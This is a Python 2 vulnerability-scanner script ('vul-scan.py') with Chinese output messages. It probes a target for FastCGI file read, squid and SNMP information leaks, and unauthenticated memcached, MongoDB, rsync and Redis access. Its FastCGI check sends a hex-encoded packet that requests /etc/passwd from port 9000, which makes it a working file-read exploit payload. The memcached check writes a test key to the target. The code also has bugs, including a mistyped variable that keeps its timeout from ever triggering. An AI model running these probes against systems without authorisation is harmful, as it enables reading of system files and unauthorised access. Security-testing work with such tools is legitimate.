#!/usr/bin/env python
#-*- coding:utf-8 -*-

import os
import sys
import time
import signal
import socket
import platform
import datetime
import threading
import argparse
import subprocess
from termcolor import colored, cprint

mutex = threading.Lock()	#线程互斥锁

class TimeoutError(Exception):
	pass

class Watcher:
	def __init__(self):
		self.child = os.fork()
		if self.child == 0:
			return
		else:
			self.watch()
	
	def watch(self):
		try:
			os.wait()
		except KeyboardInterrupt:
			self.kill()
		sys.exit()

	def kill(self):
		try:
			os.kill(self.child, signal.SIGKILL)
		except OSError:
			pass

def domain2ip(domain):
	return socket.getaddrinfo(domain, None)[0][4][0]

def command(cmd, timeout):
	is_linux = platform.system() == 'Linux'
	p = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid if is_linux else None)
	t_beginning = time.time()
	seconds_passed = 0
	while True:
		if p.poll() is not None:
			break
		seconds_passwd = time.time() - t_beginning
		if timeout and seconds_passed > timeout:
			if is_linux:
				os.killpg(p.pid, signal.SIGTERM)
			else:
				p.terminate()
			raise TimeoutError(cmd, timeout)
		time.sleep(0.1)
	return p.stdout.read()

def check_fastcgi_vul(host, port):
	ip = domain2ip(host)
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(3.0)
		sock.connect((ip, 9000))
		data = """
		01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
		01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
		54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
		56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50 
		2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
		4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
		52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49 
		50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f 
		70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
		4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
		63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
		"""
		data_s = ''
		for _ in data.split():
			data_s += chr(int(_,16))
		sock.send(data_s)
		try:
			ret = sock.recv(1024)
			if ret.find(':root:') > 0:
				cprint ('[+]存在漏洞: fastcgi文件读取漏洞!', 'green')
			else:
				cprint ('[-]主人,检查完fastcgi,不存在漏洞..', 'red')
		except Exception, e:
			cprint ('[-]主人,检查完fastcgi,不存在漏洞..', 'red')
		#sock.close()
	except:
		cprint ('[-]主人,检查完fastcgi,不存在漏洞..', 'red')

def check_squid_disclose(host, port):
	cmd_str = 'squidclient -h %s -p %d mgr:info'%(host, port)
	try:
		cmd_str = cmd_str.strip()
		result = command(cmd_str, 2)
		if result.find('HTTP/1.1 200') is not -1:
			cprint ('[+]存在漏洞: squid服务器信息泄漏!', 'green')
		else:
			cprint ('[-]主人,检查完squid,不存在泄漏..', 'red')
	except:
		cprint ('[-]主人,检查完squid,不存在泄漏..', 'red')

def check_snmp_disclose(host, port):
	ip = domain2ip(host)
	cmd_str = 'snmpcheck -T 1 -t %s'%ip
	cmd_str = cmd_str.strip()
	result = os.popen(cmd_str).read()
	if result.find('Hostname') is not -1:
		cprint ('[+]存在漏洞: snmp服务器信息泄漏!', 'green')
	else:
		cprint ('[-]主人,检查完snmp,不存在泄漏..', 'red')

def check_memcache_unauth(host, port):
	import memcache
	ip = domain2ip(host)
	host = '%s:%d'%(ip, 11211)
	host = host.strip()
	try:	
		mc = memcache.Client([host], debug=0)
		mc.set('WhatIsYourVuls','killdone')
		if mc.get('WhatIsYourVuls') == 'killdone':
			cprint ('[+]存在漏洞: memcached服务器未授权访问!', 'green')
			mc.delete('WhatIsYourVuls')
		else:
			cprint ('[-]主人,检查完memcached,不存在未授权漏洞..', 'red')
	except:
		cprint ('[-]主人,检查完memcached,不存在未授权漏洞..', 'red')

def check_mongodb_unauth(host, port):
	import pymongo
	ip = domain2ip(host)
	try:
		conn = pymongo.Connection(ip, 27017)
		if conn is not None:
			cprint ('[+]存在漏洞: mongodb未授权访问!', 'green')
		else:
			cprint ('[-]主人,检查完mongodb,不存在未授权漏洞..', 'red')
		conn.close()
	except:
		cprint ('[-]主人,检查完mongodb,不存在未授权漏洞..', 'red')

def check_rsync_unauth(host, port):
	ip = domain2ip(host)
	cmd_str = 'rsync %s'%ip+'::'
	try:
		cmd_str = cmd_str.strip()
		result = command(cmd_str, 2)
		if result.find('rsync error') is -1:
			cprint ('[+]存在漏洞: rsync未授权访问!', 'green')
		else:
			cprint ('[-]主人,检查完rsync,不存在未授权漏洞..', 'red')
	except:
		cprint ('[-]主人,检查完rsync,不存在未授权漏洞..', 'red')

def check_redis_unauth(host, port):
	import redis
	ip = domain2ip(host)
	try:
		r = redis.Redis(ip, port=6379, db=0)
		if r.ping() is True:
			cprint ('[+]存在漏洞: redis服务器未授权访问!', 'green')
		else:
			cprint ('[-]主人,检查完redis,不存在未授权漏洞..', 'red')
		r.disconnect()
	except:
		cprint ('[-]主人,检查完redis,不存在未授权漏洞..', 'red')

def scanning(host,port):
	#线程池
	threads = []

	scripts=[
			check_fastcgi_vul,
			check_squid_disclose,
			check_snmp_disclose,
			check_memcache_unauth,
			check_mongodb_unauth,
			check_rsync_unauth,
			check_redis_unauth
			]
	#指定多线程
	for script in scripts:
		if mutex.acquire():
			Watcher()
			thread = threading.Thread(target=script, args=(host, port,))
			thread.start()
			mutex.release()
			threads.append(thread)
	for thread in threads:
		thread.join()

def arg_parse():
	parser = argparse.ArgumentParser(prog='python vul-scan.py', usage='%(prog)s HOST port[80]', description='Scanning vulnerability system')
	parser.add_argument(
				'target',
				type=str,
				help='use a hostname/ip')
	parser.add_argument(
				'port',
				type=int,
				help='use a port')
	args = parser.parse_args()
	if args.target is not None:
		scanning(args.target, args.port)

def main():
	arg_parse()

if __name__ == '__main__':
	main()
